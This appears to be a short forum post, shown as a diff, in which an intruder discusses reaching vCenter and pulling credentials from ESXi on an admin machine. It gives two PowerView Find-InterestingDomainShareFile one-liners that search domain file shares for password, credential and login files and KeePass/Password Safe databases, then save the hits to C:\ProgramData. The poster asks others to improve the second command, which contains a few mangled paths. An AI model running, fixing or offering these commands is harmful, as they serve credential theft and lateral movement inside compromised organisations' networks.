@@ -1,0 +1,9 @@
+No way, this is done through VCENTER. Try to find credentials from ESXI on the admin computer. Or fuck Powerview request
+Code:
+Find-InterestingDomainShareFile -Include @('*passw*.txt','*credential*.txt','*login*.txt','*usernames*.txt','*passw*.csv','*credential *.csv','*login*.csv','*usernames*.csv','*passw*.doc','*credential*.doc','*login*.doc','*usernames*. doc','*passw*.docx','*credential*.docx','*login*.docx','*usernames*.docx','*passw*.xls','*credential*.xls' ,'*login*.xls','*usernames*.xls','*passw*.xlsx','*credential*.xlsx','*login*.xlsx','*usernames*.xlsx',' *passw*.rtf','*credential*.rtf','*login*.rtf','*usernames*.rtf','*.psafe3','*.kdbx','*.kdb')| Out-File -Width 400 -Encoding ascii C:\ProgramData\find_creds.txt
+
+If anyone makes a request “more beautiful”, more correctly, etc., I will be grateful. I tried this
+Code:
+
+$names=@('*pass*','*cred*','*usernam*','*admin*','*login*','*cred*');Find-InterestingDomainShareFile -Include $names|  Where-Object {$_.Extension -match '.txt|.docx|.doc|.rtf|.csv|.xlsx|.psafe3|.kdbx|.kdb'}|Out-File -Width 400 -Encoding ascii C :\ProgramData\find.txt
+But something didn't work out
